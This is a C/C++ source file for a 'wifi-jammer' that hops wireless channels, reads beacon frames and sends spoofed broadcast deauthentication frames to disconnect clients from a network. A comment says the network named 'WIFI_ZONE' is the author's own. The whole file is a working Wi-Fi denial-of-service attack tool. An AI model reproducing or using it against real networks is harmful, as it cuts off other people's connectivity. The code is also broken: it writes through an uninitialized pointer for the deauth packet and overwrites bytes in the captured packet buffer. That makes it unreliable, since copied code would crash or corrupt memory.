#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <thread>
#include <vector>

#include "pstruct.h"
#include "ex_iwfunc.h"

std::vector<int> channels;

u_int8_t broadcast_mac[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };

void usage() {
	printf("syntax : wifi-jammer <interface>\n");
	printf("sample : wifi-jammer mon0\n");
}

typedef struct {
	char* dev_;
} Param;

Param param  = {
	.dev_ = NULL
};

bool parse(Param* param, int argc, char* argv[]) {
	if (argc != 2) {
		usage();
		return false;
	}
	param->dev_ = argv[1];	
	return true;
}

std::vector<int> channelList(int skfd, const char* dev) {
	FILE *	fh;
    #ifndef IW_RESTRIC_ENUM
      /* Check if /proc/net/dev is available */
      	fh = fopen(PROC_NET_DEV, "r");
    #else
      /* Check if /proc/net/wireless is available */
      	fh = fopen(PROC_NET_WIRELESS, "r");
    #endif

	struct iw_range range;
	double freq;
	char buffer[128];
	
	std::vector<int> channel_vector;

    if(fh != NULL) {
		if(iw_get_range_info(skfd, dev, &range) < 0) { 
        	fprintf(stderr, "%-8.16s  no frequency information.\n\n", dev); //debugging
    	}
    	else {
        	if(range.num_frequency > 0) {
            	printf("\t\tDev : %-8.16s - %d channels in total\n", dev, range.num_channels);
            	printf("=================== available frequencies =====================\n");
	            for(int k = 0; k < range.num_frequency; k++) {
	            	freq = iw_freq2float(&(range.freq[k]));
				    iw_print_freq_value(buffer, sizeof(buffer), freq);
	            	channel_vector.push_back(range.freq[k].i);
	                printf("\t\t Channel %.2d : %s\n", range.freq[k].i, buffer); //debugging
            	}
            	printf("==============================================================\n");
        	}
    	}
    }
    return channel_vector;
}

void channelHopping(int skfd, const char* dev) {
	struct iwreq wrq;
	double freq;

	srand((unsigned)time(NULL));
	
	while(1) {
		freq = channels[rand() % (channels.size() - 1 - 0 + 1) + 0];

    	iw_float2freq(freq, &(wrq.u.freq));
	    wrq.u.freq.flags = IW_FREQ_FIXED;  
	    
	    iw_set_ext(skfd, dev, SIOCSIWFREQ, &wrq); //set channel
	    
	    printf("[%s] channel hopping %.2d\n", dev, (int)freq);
	    sleep(1);
	}
	
}


void set_mac(u_int8_t target[], u_int8_t value[]) {
	for(int i = 0; i < 6; i++) {
		target[i] = value[i];
	}
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
	
	int skfd = iw_sockets_open();
	/*channel list*/
	channels = channelList(skfd, param.dev_);
	
	
	/*channel hopping*/
	std::thread t(channelHopping, skfd, param.dev_);
	t.detach();

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		
		struct ieee80211_radiotap_header* radioTap;
		struct beacon_frame_header* beaconFrame;
		struct fixed_parameters* fixed;
		struct tagged_parameters* tagged;
		
		int res = pcap_next_ex(pcap, &header, &packet);

		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
			break;
		}

		radioTap = (ieee80211_radiotap_header*)(packet);
		int radio_len = radioTap->it_len;
		beaconFrame = (beacon_frame_header*)(packet + radio_len);
		
		if(beaconFrame->fcf.subtype == 0x8 && beaconFrame->fcf.type == 0x0 && beaconFrame->fcf.version == 0x0) {
		
			int beacon_len = sizeof(struct beacon_frame_header);
			fixed = (fixed_parameters*)(packet + radio_len + beacon_len);
			int fixed_len = sizeof(struct fixed_parameters) - 4; //struct padding
			tagged = (tagged_parameters*)(packet + radio_len + beacon_len + fixed_len);
			int tagged_len = sizeof(struct tagged_parameters);
			int essid_len = tagged->tag_length;
			
			u_char* essid = (u_char*)(packet + radio_len + beacon_len + fixed_len + tagged_len);
			essid[essid_len] = 0;
			
			struct deauthentication_packet* deauth;

			memset(deauth, 0, sizeof(*deauth));

			deauth->radiotap.it_len = 0x8;
			deauth->deauth_header.type = 0xc0;

			set_mac(deauth->deauth_header.dst_mac, broadcast_mac);
			set_mac(deauth->deauth_header.src_mac, beaconFrame->src_addr);
			set_mac(deauth->deauth_header.bss_id, beaconFrame->src_addr);
			deauth->fixed.reason_code = 0x7;
			
			if(strncmp((char*)essid, "WIFI_ZONE", 9) == 0) { //my wifi...
				int res = pcap_sendpacket(pcap, (u_char*)deauth, sizeof(deauthentication_packet));
				if (res != 0) {
					printf("pcap_sendpacket return %d(%s)\n", res, pcap_geterr(pcap));
					break;
				}
				printf("[%s -> %s] send deauthentication packet\n", param.dev_, essid);
				//sleep(1);
			}
		}
	}
	pcap_close(pcap);
	iw_sockets_close(skfd);
}
